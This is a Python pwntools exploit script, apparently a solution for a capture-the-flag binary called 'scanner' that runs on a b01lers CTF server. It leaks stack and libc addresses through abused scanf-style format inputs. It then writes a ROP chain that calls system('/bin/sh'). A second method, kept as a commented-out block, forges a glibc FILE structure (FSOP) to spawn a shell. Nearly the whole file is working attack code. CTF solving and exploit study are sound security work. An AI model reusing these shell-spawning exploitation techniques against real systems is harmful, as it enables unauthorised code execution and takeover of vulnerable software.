from pwn import *
from icecream import ic

elf = exe = ELF("./scanner_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("scanfun.harkonnen.b01lersc.tf", 8443, ssl=True)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *scan+162
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a, timeout=1)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

# stack based
while True:
    try:
        io = start()
        ru("[")
        leak = int(ru("]")[:-1], 16)

        def scan(st,data):
            sla(b"to scan?",st)
            sl(data)

        scan(b"%16$11c", b"a"*0x8 + b'\xa8\xd7' + p8(leak))

        scan(b"%19$2c", b'\xc8\xff')

        rl()
        x = re(0x75+8)
        if x == b'What do you want to scan?\n':
            raise EOFError
        libc.address = uu64(6) - 0x2a160

        ic(hex(libc.address))

        re(0x198+2)

        stack = uu64(6) - 0x180
        ic(hex(stack))

        payload = p64(qgad(libc, "rdi") + 1)
        payload += p64(qgad(libc, "rdi"))
        payload += p64(binsh(libc))
        payload += p64(libc.sym['system'])

        scan(b"%16$8c", p64(stack))
        scan(b"%18$32c", payload)
        sl(b'ls')
        break
    except EOFError:
        io.close()
        continue


'''

THIS ALSO WORKS!
fsop'''
'''

while True:
    try:
        io = start()
        ru("[")
        leak = int(ru("]")[:-1], 16)

        def scan(st,data):
            sla(b"to scan?",st)
            sl(data)

        scan(b"%16$11c", b"a"*0x8 + b'\xa8\xd7' + p8(leak))
        scan(b"%19$1c", b'\xff')

        rl()
        x = re(0x75+8)
        if x == b'What do you want to scan?\n':
            raise EOFError
        libc.address = uu64(6) - 0x2a160

        ic(hex(libc.address))
        
        scan(b"%16$11c", b"a"*0x8 + b'\x80\xd7' + p8(leak))

        def FSOP_struct(flags=0, _IO_read_ptr=0, _IO_read_end=0, _IO_read_base=0,
                        _IO_write_base=0, _IO_write_ptr=0, _IO_write_end=0, _IO_buf_base=0, _IO_buf_end=0,
                        _IO_save_base=0, _IO_backup_base=0, _IO_save_end=0, _markers=0, _chain=0, _fileno=0,
                        _flags2=0, _old_offset=0, _cur_column=0, _vtable_offset=0, _shortbuf=0, lock=0,
                        _offset=0, _codecvt=0, _wide_data=0, _freeres_list=0, _freeres_buf=0,
                        __pad5=0, _mode=0, _unused2=b"", vtable=0, more_append=b""):

            FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
            FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
            FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
            FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
            FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
            FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
            FSOP += p64(__pad5) + p32(_mode)
            if _unused2 == b"":
                FSOP += b"\x00" * 0x14
            else:
                FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")

            FSOP += p64(vtable)
            FSOP += more_append
            return FSOP

        payload = FSOP_struct(flags=u64(b'1w;sh\x00'.ljust(8, b'\x00')), _old_offset = 0xffffffffffffffff, lock = libc.address+0x21ca70, _offset = 0xffffffffffffffff, _wide_data=libc.sym['_IO_2_1_stdout_']-0x10, _unused2 = p32(0) + p64(libc.sym['system']) + p64(libc.sym['_IO_2_1_stdout_'] + 0x60), vtable=libc.sym['_IO_file_jumps'] - 0x528 - 0x38)

        scan(f"%19${len(payload)}c".encode(), payload)
        sl(b'ls')
        break
    
    except EOFError:
        io.close()
        continue

'''

io.interactive()
